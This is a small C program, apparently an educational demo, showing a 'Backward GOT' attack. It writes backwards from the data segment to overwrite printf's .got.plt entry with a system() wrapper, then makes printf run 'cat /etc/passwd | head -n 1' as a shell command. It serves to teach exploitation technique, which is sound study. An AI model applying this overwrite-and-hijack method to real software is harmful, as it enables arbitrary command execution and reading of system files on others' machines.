// gcc -std=c99 -fno-builtin backwardgot.c

#include <stdio.h>
#include <stdlib.h>

void exec(char *exec_me) {
	system(exec_me);
}

int main() {
	printf("Welcome to 'Backward GOT' which shows how writing backwards from the data segment can lead to overwriting GOT entries. Since the .got.plt section is directly before the data segment, writing backwards from the data segment can cross this section boundary.\n\n");
	printf("First we'll allocate a character in the data segment.\n");
	static char a = '\0';
	printf("The character is at location %p\n", &a);
	char *b = &a;
	unsigned long int got_ptr = *((unsigned int *)((unsigned long int)printf + 2)) + printf + 6;
	printf("The .got.plt entry for function 'printf' is at %p\n", got_ptr);
	unsigned long int amount = (unsigned long int)(&a) - (unsigned long int)got_ptr - (8 - 1);
	printf("The offset of this from the variable in the data segment is %d bytes. We will now overwrite to this boundary\n", amount);
	for(int i=0; i<amount; i++) {
		*b = 'A';
		b--;
	}
	puts("Now we put the address of the exec() function in place of the 'printf' entry.\n");
	for(int i=1; i<9; i++) {
		*b = ((long int)exec & (0xff << (8*8 - 8*i))) >> (8*8 - 8*i);
		b--;
	}
	puts("Finally, we call printf() with the string 'cat /etc/passwd | head -n 1'\n");
	printf("cat /etc/passwd | head -n 1");
}
